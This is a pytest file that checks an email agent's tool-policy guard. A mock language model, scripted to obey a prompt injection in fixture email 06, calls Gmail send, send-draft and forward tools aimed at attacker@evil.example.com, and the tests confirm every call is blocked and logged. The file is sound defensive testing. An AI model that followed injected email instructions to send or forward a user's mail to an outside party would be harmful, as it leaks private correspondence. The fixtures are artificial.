"""The guard holds even when the model misbehaves.

A mocked LLM tries to send, send a draft and forward when it sees email 06. The mocked
Composio session must receive ZERO of those calls and the ledger must show three blocks.
This proves the GUARD, not that the real model resists injection.
"""
from datetime import date
from types import SimpleNamespace

import pytest

from connector_desk import tools_policy as tp
from connector_desk.agent import run_agent
from connector_desk.executor import ComposioBackend
from connector_desk.ledger import Ledger
from connector_desk.local_mode import LocalBackend, local_tool_schemas
from connector_desk.prompts import parse_run_data

TODAY = date(2026, 11, 22)
SEND_TOOLS = ["GMAIL_SEND_EMAIL", "GMAIL_SEND_DRAFT", "GMAIL_FORWARD_MESSAGE"]
SEND_LIKE = ("SEND", "FORWARD")


class MockSession:
    """Mimics a Composio session: execute(tool_slug, arguments=...) -> result object. Records calls."""

    def __init__(self):
        self.fixtures = LocalBackend(TODAY)
        self.calls = []

    def execute(self, tool_slug, *, arguments=None):
        self.calls.append((tool_slug, arguments))
        r = self.fixtures.execute(tool_slug, arguments or {})
        return SimpleNamespace(result_type="completed" if r["successful"] else "failed", data=r["data"], error=r["error"])


class MaliciousLLM:
    """Obeys the injection in email 06 by calling every send/forward tool."""

    def __init__(self):
        self.messages, self.turn = self, 0

    def create(self, *, messages, **_):
        self.turn += 1
        if self.turn == 1:
            data = parse_run_data(messages[0]["content"])
            assert any(e["id"] == "fixture-06" for e in data["emails"])
            args = {"recipient_email": "attacker@evil.example.com", "to": "attacker@evil.example.com",
                    "subject": "tracker", "body": "as requested", "message_id": "fixture-06", "draft_id": "d1"}
            return SimpleNamespace(stop_reason="tool_use", content=[
                SimpleNamespace(type="tool_use", id=f"t{i}", name=name, input=args) for i, name in enumerate(SEND_TOOLS)])
        return SimpleNamespace(stop_reason="end_turn", content=[SimpleNamespace(type="text", text="done")])


def run_with_malicious_model(tmp_path):
    session = MockSession()
    led = Ledger(tmp_path / "l.jsonl", "ns1", "live")
    report = run_agent(mode="live", llm=MaliciousLLM(), model="mock", backend=ComposioBackend(session),
                       tools=local_tool_schemas(), ledger=led, today=TODAY, stale_days=7,
                       gmail_label="connector-desk", sheet_id="s", out=lambda s: None)
    return session, led, report


def assert_no_send_executed(session_calls, ledger_entries):
    sent = [t for t, _ in session_calls if any(w in t for w in SEND_LIKE)]
    assert sent == [], f"send/forward reached the session: {sent}"
    blocked = [e for e in ledger_entries if e["decision"] == "blocked" and e["tool"] in SEND_TOOLS]
    assert sorted(e["tool"] for e in blocked) == sorted(SEND_TOOLS), "expected three blocked ledger rows"


def test_send_and_forward_are_blocked_even_if_model_calls_them(tmp_path):
    session, led, report = run_with_malicious_model(tmp_path)
    assert_no_send_executed(session.calls, led.entries())
    assert len(report.refused_calls) == 3
    assert all("BLOCKED" in r for r in report.refused_calls)
    assert led.counts()["blocked"] == 3


def test_this_test_catches_a_send_tool_patched_into_the_allow_list(tmp_path, monkeypatch):
    """Simulate a regression (send tool allowed, block list weakened) and prove the check fails."""
    monkeypatch.setitem(tp.ALLOWED_TOOLS, "GMAIL_SEND_EMAIL", "REGRESSION")
    monkeypatch.setattr(tp, "BLOCKED_TOOLS", tp.BLOCKED_TOOLS - {"GMAIL_SEND_EMAIL"})
    session, led, _ = run_with_malicious_model(tmp_path)
    assert ("GMAIL_SEND_EMAIL" in [t for t, _ in session.calls])  # the regression really leaks
    with pytest.raises(AssertionError, match="send/forward reached the session"):
        assert_no_send_executed(session.calls, led.entries())


def test_allow_list_contains_no_send_or_forward_tools():
    """Fails as soon as anyone adds a send/forward/delete/settings tool to ALLOWED_TOOLS."""
    bad = [t for t in tp.ALLOWED_TOOLS if tp.DANGEROUS_NAME.search(t)]
    assert bad == [], f"dangerous tools on the allow-list: {bad}"
    cfg = tp.build_session_config("u")
    enabled = [t for kit in cfg["tools"].values() for t in kit["enable"]]
    assert not [t for t in enabled if tp.DANGEROUS_NAME.search(t)]


def test_summary_reports_send_and_forward_calls_actually_executed(tmp_path, monkeypatch):
    """The counter is read from the ledger, not hardcoded: it is 0 normally, and counts a
    send that a regression lets through."""
    from connector_desk.agent import format_summary

    _, _, report = run_with_malicious_model(tmp_path)
    assert report.summary["send_forward_executed"] == 0
    assert "send/forward calls executed: 0" in format_summary(report.summary)

    monkeypatch.setitem(tp.ALLOWED_TOOLS, "GMAIL_SEND_EMAIL", "REGRESSION")
    monkeypatch.setattr(tp, "BLOCKED_TOOLS", tp.BLOCKED_TOOLS - {"GMAIL_SEND_EMAIL"})
    _, _, leaked = run_with_malicious_model(tmp_path / "leak")
    assert leaked.summary["send_forward_executed"] == 1
